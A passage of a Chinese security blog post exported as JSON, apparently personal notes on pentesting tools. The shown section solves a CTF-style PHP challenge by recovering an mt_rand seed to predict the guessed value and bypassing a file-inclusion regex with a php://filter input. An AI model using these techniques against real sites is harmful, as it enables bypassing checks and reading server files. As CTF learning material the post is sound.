aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/tooluse(Commontools)/image-20221120141340099.png\" alt=\"image-20221120141340099\"></p>\n<p>于是我们就得到了我们的<code>seed</code></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1145146</p></blockquote>\n<p>再分析源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hint: \"</span><span class=\"token operator\">.</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'guess'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'guess'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这里在 echo处已经随机了一次，所以在底下比较的时候就算第二个随机数进行强类型比较</p>\n<p>于是</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php \nmt_srand(&quot;1145146&quot;);\necho mt_rand();\necho &#39;&lt;br&gt;&#39;;\necho mt_rand();\n\n&#x3D;&#x3D;&gt;1219893521&lt;br&gt;1202031004<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得到<code>guess</code>参数的值<code>1202031004</code></p>\n<p>对于最后对<code>file</code>文件包含语句的正则匹配绕过</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/base|\\.\\./i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/NewStar/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>大概就是不能出现<code>base</code>，然后参数中间要包含<code>/NewStar/</code>这一段</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?file&#x3D;php:&#x2F;&#x2F;filter<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id><a href=\"#\" class=\"headerlink\" title></a></h1>","text":"记性不好记录一下 常用工具的使用1）msf（1）msf基本使用一个漏洞利用框架,对计算机软件漏洞进行攻击 这里以vulnhub dc1为例 终端输入msfcon...","permalink":"/post/tooluse(Commontools)","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"daily","slug":"daily","count":7,"path":"api/categories/daily.json"}],"tags":[{"name":"tools","slug":"tools","count":3,"path":"api/tags/tools.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">常用工具的使用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1%EF%BC%89msf\"><span class=\"toc-text\">1）msf</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%EF%BC%881%EF%BC%89msf%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">（1）msf基本使用</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%EF%BC%882%EF%BC%89msf%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E6%A8%A1%E5%9D%97\"><span class=\"toc-text\">（2）msf后门生成模块</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%99%AE%E9%80%9A%E7%94%9F%E6%88%90\"><span class=\"toc-text\">普通生成</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BC%96%E7%A0%81%E7%94%9F%E6%88%90\"><span class=\"toc-text\">编码生成</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BB%A5DC-3%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90\"><span class=\"toc-text\">*以DC-3举个例子</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#msf%E5%88%A9%E7%94%A8%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">msf利用木马</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#msfvenom-%E2%80%94list-archs\"><span class=\"toc-text\">msfvenom —list archs</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#msfvenom-%E2%80%94list-platforms\"><span class=\"toc-text\">msfvenom —list platforms</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E7%94%9F%E6%88%90%E6%A0%BC%E5%BC%8F\"><span class=\"toc-text\">常见生成格式</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1%E3%80%81-Windows\"><span class=\"toc-text\">1、 Windows</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2%E3%80%81Linux\"><span class=\"toc-text\">2、Linux</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3%E3%80%81Mac\"><span class=\"toc-text\">3、Mac</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4%E3%80%81Android\"><span class=\"toc-text\">4、Android</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5%E3%80%81Aspx\"><span class=\"toc-text\">5、Aspx</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#6%E3%80%81JSP\"><span class=\"toc-text\">6、JSP</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#7%E3%80%81PHP\"><span class=\"toc-text\">7、PHP</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#8%E3%80%81BASH\"><span class=\"toc-text\">8、BASH</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#9%E3%80%81Python\"><span class=\"toc-text\">9、Python</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Msfvenom%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0\"><span class=\"toc-text\">Msfvenom常用命令参数</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2%EF%BC%89hydra\"><span class=\"toc-text\">2）hydra</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81\"><span class=\"toc-text\">1.爆破用户密码</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3%EF%BC%89cewl\"><span class=\"toc-text\">3）cewl</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4%EF%BC%89wpscan\"><span class=\"toc-text\">4）wpscan</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#5%EF%BC%89John\"><span class=\"toc-text\">5）John</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#6%EF%BC%89weevely\"><span class=\"toc-text\">6）weevely</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#7%EF%BC%89whatweb\"><span class=\"toc-text\">7）whatweb</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#8%EF%BC%89knockd\"><span class=\"toc-text\">8）knockd</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-knock%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">1&gt; knock命令</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-nc%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">2&gt;nc命令</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#9-openssl\"><span class=\"toc-text\">9)openssl</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SSL-%E7%AE%80%E4%BB%8B\"><span class=\"toc-text\">SSL 简介</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#10-gobuster\"><span class=\"toc-text\">10)gobuster</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%88%86%E7%A0%B4%E7%9B%AE%E5%BD%95\"><span class=\"toc-text\">爆破目录</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%88%86%E7%A0%B4%E5%AD%90%E5%9F%9F%E5%90%8D\"><span class=\"toc-text\">爆破子域名</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#11-seed%E5%B7%A5%E5%85%B7php-mt-seed\"><span class=\"toc-text\">11)seed工具php_mt_seed</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\"><span class=\"toc-text\"></span></a></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Burpsuite密码爆破","uid":"463054968cf55cbdec365eb1472bde0e","slug":"tooluse(bp-bruce)","date":"2023-02-13T13:43:45.284Z","updated":"2023-08-06T08:00:41.147Z","comments":true,"path":"api/articles/tooluse(bp-bruce).json","keywords":null,"cover":"/img/26.jpg","text":"顺便记一下，免得后面到处翻 Burpsuite密码爆破虽然不知道这个网站是那位大佬总结建立的，但还是很感谢，节省很多时间，这个网站提供了很全面的密码表 http...","permalink":"/post/tooluse(bp-bruce)","photos":[],"count_time":{"symbolsCount":"2.2k","symbolsTime":"2 mins."},"categories":[{"name":"daily","slug":"daily","count":7,"path":"api/categories/daily.json"}],"tags":[{"name":"tools","slug":"tools","count":3,"path":"api/tags/tools.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"golang","uid":"54d4e8482c6dc0ae7c398e63273488f8","slug":"Go","date":"2022-12-23T13:16:34.183Z","updated":"2023-09-06T12:29:46.996Z","comments":true,"path":"api/articles/Go.json","keywords":null,"cover":"/img/7.jpg","text":"主要从黄哥的资料笔记，尚硅谷，以及谢先斌大佬的笔记https://www.xiexianbin.cn/golang 以及https://exercism.org...","permalink":"/post/Go","photos":[],"count_time":{"symbolsCount":"5.6k","symbolsTime":"5 mins."},"categories":[{"name":"语言学习","slug":"语言学习","count":1,"path":"api/categories/语言学习.json"}],"tags":[{"name":"go语言","slug":"go语言","count":2,"path":"api/tags/go语言.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}